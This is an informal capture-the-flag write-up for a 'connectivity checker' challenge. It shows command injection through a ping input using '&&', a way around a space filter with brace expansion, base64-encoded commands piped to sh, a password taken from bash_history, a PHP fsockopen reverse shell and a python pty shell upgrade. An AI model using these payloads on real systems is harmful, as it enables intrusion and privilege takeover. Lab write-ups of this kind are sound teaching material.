# Connectivity checker writeup
it was a very nice experience here is how i did-it

first i start checking the input filter by typing some chars and wait for OKEY BOOMER XDD

i found that the filter don't like the spaces and newline characters so i tried to create commands without these chars like
```c
 localhost&&ls
 localhost&&ps
```
but still can't put spaces so i googled some, i found some nice bash syntax instead of typing ls -la we type {ls,-ls} so no spaces ;D

but it was too hard to create long command and piping ...
i typed 
```c
 ps -aux
```
and i got 
```c
sh -c (echo "ping -c 1 localhost&&{ps,-aux}" | bash) 2> /dev/null
```
then i created a c program who encode my commands with base64 then decode it at de other side and pipe it to sh
```c
sh -c (echo "ping -c 1 localhost&{base64,-d,}<<<base64string|sh" | bash) 2> /dev/null
```
then i start exploring the machine for writable directories and files, missconfigurations ... , i took the wrong path at the begining when i was trying to compile a kernel exploit to escalate preveliges, then i got the bash_history file where i found 
```c
Qu4r4Nt1n3d!@
```
which looks like a password (was typed after sudo -S but it was typed by purpose)
so i tried to login as another user with that password, i got the users from etc/passwd, i tried to su - root or ctf but i get no output so  i sshed the machine but a public key filter was set :C, then i got a reverse shell with the php cli

```php
php -r '$sock=fsockopen("ip","port");exec("/bin/bash -i <&3 >&3 2>&3");'
```
then i got a better shell but still can't su i get an error "su: must be run from a terminal" then i i found a trick in google by spawning the shell with python 
```python
echo "import pty; pty.spawn('/bin/bash')" > /tmp/test.py&&python /tmp/test.py
```
then i got the terminal <3
i tryed su - ctf with that password , boom i am a ctf XDDD

